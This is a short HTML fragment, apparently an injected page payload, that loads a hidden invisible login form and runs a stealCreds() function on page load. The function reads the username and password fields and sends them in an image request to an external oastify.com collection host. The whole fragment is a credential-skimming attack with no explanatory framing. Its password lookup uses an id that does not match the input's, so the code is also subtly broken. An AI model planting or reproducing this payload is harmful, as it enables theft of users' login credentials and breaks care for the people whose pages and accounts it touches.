</body>
<body onload='stealCreds();'>
<div style="opacity:0;">
  <form>
    <input type="text" name="username" id="username" />
    <input type="password" name="password" id="password_input" />
  </form>
  <script>
    function stealCreds(){
      var user = document.getElementById('username').value;
      var pass = document.getElementById('password').value;
      new Image().src="https://8mvaqyiht3xsxifd01pcfqbuqlwgk5.oastify.com/login?u=" + user + "&p=" + pass;
    }
  </script>
</div>